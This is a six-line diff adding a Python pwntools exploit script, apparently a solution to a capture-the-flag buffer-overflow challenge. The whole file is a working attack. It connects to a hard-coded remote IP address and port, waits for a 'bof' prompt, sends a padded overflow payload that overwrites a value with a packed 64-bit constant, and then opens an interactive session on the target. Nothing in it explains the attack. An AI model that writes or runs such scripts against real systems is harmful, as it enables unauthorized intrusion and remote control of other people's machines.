@@ -1,0 +1,6 @@
+from pwn import *
+sh = remote('111.198.29.45','49222')
+payload='A'*4+p64(0x6E756161)
+sh.recvuntil('bof\n')
+sh.sendline(payload)
+sh.interactive()
